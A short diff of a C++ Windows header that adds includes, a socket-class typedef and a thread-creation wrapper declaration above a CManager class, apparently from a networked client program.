@@ -9,7 +9,19 @@
 #pragma once
 #endif // _MSC_VER > 1000
 
+#include <windows.h>
+#include "..\common\commands.h"
+
 class IOCPClient;
+
+typedef IOCPClient CClientSocket;
+
+HANDLE MyCreateThread(LPSECURITY_ATTRIBUTES lpThreadAttributes, // SD
+	SIZE_T dwStackSize,                       // initial stack size
+	LPTHREAD_START_ROUTINE lpStartAddress,    // thread function
+	LPVOID lpParameter,                       // thread argument
+	DWORD dwCreationFlags,                    // creation option
+	LPDWORD lpThreadId, bool bInteractive = false);
 
 class CManager  
 {
